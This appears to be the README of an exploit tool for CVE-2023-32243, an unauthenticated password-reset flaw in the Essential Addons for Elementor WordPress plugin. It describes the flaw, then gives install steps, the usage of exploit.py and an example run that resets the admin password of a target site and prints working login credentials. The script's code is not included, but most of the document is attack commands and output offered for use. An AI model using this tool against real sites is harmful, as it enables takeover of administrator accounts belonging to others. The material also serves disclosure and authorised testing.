# CVE-2023-32243.
Essential Addons for Elementor 5.4.0-5.7.1 - Unauthenticated Privilege Escalation

Info
---
The plugin does not validate the password reset key, which could allow unauthenticated attackers to reset arbitrary account's password to anything they want, by knowing the related email or username, gaining access to them

Python Setup
----

```
pip install -r requirements.txt
```


Exploit Details
----

https://patchstack.com/articles/critical-privilege-escalation-in-essential-addons-for-elementor-plugin-affecting-1-million-sites/

Usage
----

```
usage: exploit.py [-h] -u URL -p PASSWORD [-usr USERNAME]

options:
  -h, --help            show this help message and exit
  -u URL, --url URL     URL of the WordPress site
  -p PASSWORD, --password PASSWORD
                        Password to set for the selected username
  -usr USERNAME, --username USERNAME
                        Username of the user to reset if you already know it.
 ```

Example
----

```
python3 exploit.py --url http://wordpress.lan  --password "adminadmin2"
Please select a username:
1. admin
> 1
Nonce value: f010bc2ac9
All Set! You can now login using the following credentials:
Username:  admin
Password:  adminadmin2
Admin Url: http://wordpress.lan/wp-admin/
```
